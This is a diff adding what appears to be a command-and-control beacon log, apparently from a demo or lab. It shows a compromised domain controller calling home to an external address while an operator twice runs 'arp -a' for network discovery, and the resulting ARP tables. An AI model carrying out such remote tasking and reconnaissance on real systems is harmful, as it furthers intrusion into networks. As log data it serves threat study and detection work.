@@ -1,0 +1,43 @@
+11/30 23:31:12 UTC [metadata] 94.158.18.129 <- 192.168.100.5; computer: DC1; user: hostvm-demo-1; process: dns.exe; pid: 5084; os: Windows; version: 6.2; build: 9200; beacon arch: x86 (x64)
+11/30 23:37:59 UTC [input] <neo> shell arp -a
+11/30 23:38:00 UTC [task] <T1059> Tasked beacon to run: arp -a
+11/30 23:38:12 UTC [checkin] host called home, sent: 37 bytes
+11/30 23:38:12 UTC [output]
+received output:
+
+Interface: 192.168.100.5 --- 0xc
+  Internet Address      Physical Address      Type
+  192.168.100.1         00-50-56-8b-d5-61     dynamic   
+  192.168.100.10        00-16-3e-53-2b-21     dynamic   
+  192.168.100.11        00-50-56-8b-da-19     dynamic   
+  192.168.100.12        00-50-56-8b-b4-f2     dynamic   
+  192.168.100.13        00-50-56-8b-91-fe     dynamic   
+  192.168.100.30        56-6f-1c-29-00-00     dynamic   
+  192.168.100.205       00-50-56-8b-40-c8     dynamic   
+  192.168.100.255       ff-ff-ff-ff-ff-ff     static    
+  224.0.0.22            01-00-5e-00-00-16     static    
+  224.0.0.251           01-00-5e-00-00-fb     static    
+  239.255.255.250       01-00-5e-7f-ff-fa     static    
+
+
+11/30 23:38:13 UTC [input] <neo> shell arp -a
+11/30 23:38:13 UTC [task] <T1059> Tasked beacon to run: arp -a
+11/30 23:39:12 UTC [checkin] host called home, sent: 37 bytes
+11/30 23:39:12 UTC [output]
+received output:
+
+Interface: 192.168.100.5 --- 0xc
+  Internet Address      Physical Address      Type
+  192.168.100.1         00-50-56-8b-d5-61     dynamic   
+  192.168.100.10        00-16-3e-53-2b-21     dynamic   
+  192.168.100.11        00-50-56-8b-da-19     dynamic   
+  192.168.100.12        00-50-56-8b-b4-f2     dynamic   
+  192.168.100.13        00-50-56-8b-91-fe     dynamic   
+  192.168.100.30        56-6f-1c-29-00-00     dynamic   
+  192.168.100.205       00-50-56-8b-40-c8     dynamic   
+  192.168.100.255       ff-ff-ff-ff-ff-ff     static    
+  224.0.0.22            01-00-5e-00-00-16     static    
+  224.0.0.251           01-00-5e-00-00-fb     static    
+  239.255.255.250       01-00-5e-7f-ff-fa     static    
+
+
